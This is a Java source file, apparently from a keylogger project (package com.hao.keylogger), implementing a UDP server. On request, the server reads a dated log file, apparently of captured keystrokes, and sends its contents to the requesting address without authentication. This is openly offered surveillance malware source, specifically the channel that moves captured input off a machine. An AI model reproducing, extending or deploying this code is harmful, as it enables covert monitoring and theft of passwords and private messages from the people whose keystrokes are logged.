package com.hao.keylogger.controllers.server;

import java.io.File;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.StringTokenizer;

import com.hao.keylogger.models.Resource;

public class UDPServerHelper {

	private static UDPServerHelper instance;
	
	private ServerLogController controller;

	private DatagramSocket socket;
	private InetAddress address;
	private String hostName;
	private int port;

	private byte[] buffer = new byte[Resource.SERVER_BUFFER_SIZE];
	
	Thread listenThread;

	private UDPServerHelper(String hostName, int port) {
		this.hostName = hostName;
		this.port = port;
	}

	public static UDPServerHelper getInstance(String hostName, int port) {
		if (instance == null) {
			instance = new UDPServerHelper(hostName, port);
		}
		return instance;
	}

	public static String getLocalHostIP() {
		try {
			return InetAddress.getLocalHost().getHostAddress();
		} catch (UnknownHostException e) {
			e.printStackTrace();
			return "";
		}
	}

	public boolean startServer() {
		try {
			address = InetAddress.getByName(hostName);
			socket = new DatagramSocket(port, address);
			listenThread = new Thread(new RequestReceiver());
			listenThread.start();
			return true;
		} catch (SocketException | UnknownHostException e) {
			e.printStackTrace();
			return false;
		}

	}

	public boolean stopServer() {
		try {
			socket.close();
			return true;
		} catch (Exception e) {
			return false;
		}
	}

	public void setController(ServerLogController controller) {
		this.controller = controller;
	}

	private class RequestReceiver implements Runnable {	
		StringTokenizer stringTokenizer;
		
		@Override
		public void run() {
			
			while (true) {
				System.out.println("listening");
				DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);
				try {
					socket.receive(inPacket);
					String requestMsg = new String(inPacket.getData(), 0, inPacket.getLength());
					controller.appendToMonitory("Client: " + requestMsg);
					
					stringTokenizer = new StringTokenizer(requestMsg, "?");
					String requestType = stringTokenizer.nextToken();
					
					switch (requestType) {
					case Resource.FETCH_LOG_REQUEST:
						String dateStr = stringTokenizer.nextToken();
						
						// format name of log files: dd-MM-yyyy.txt
						SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy");
						Date dateOfLog = sdf.parse(dateStr);
						controller.appendToMonitory("Processing: " + "get log on the day " + dateOfLog.toString());
						getLogAndSend(inPacket.getAddress(), inPacket.getPort(), dateOfLog);
						break;
					case Resource.FETCH_ALL_LOG_REQUEST:
						break;
					}
					
				} catch (Exception e) {

				}
			}
		}
		
		private void getLogAndSend(InetAddress address, int port, Date date) {
			String dateStr = new SimpleDateFormat("dd-MM-yyyy").format(date);
			String logFilePath = Resource.LOGS_DIRECTORY + File.separator + dateStr + Resource.LOG_FILE_EXTENSION;
			FileManager fm = new FileManager(logFilePath);
			
			String logContent;
			try {
				logContent = fm.readAll();
				System.out.println(logContent);
				DatagramPacket outPacket = new DatagramPacket(logContent.getBytes(), logContent.length(), address, port);
				try {
					socket.send(outPacket);
				} catch (IOException e) {
					controller.appendToMonitory("Processing: " + "Can not send packet");
				}
			} catch (IOException e1) {
				controller.appendToMonitory("Processing: " + "File not found");
			}
			
		}
	}

}
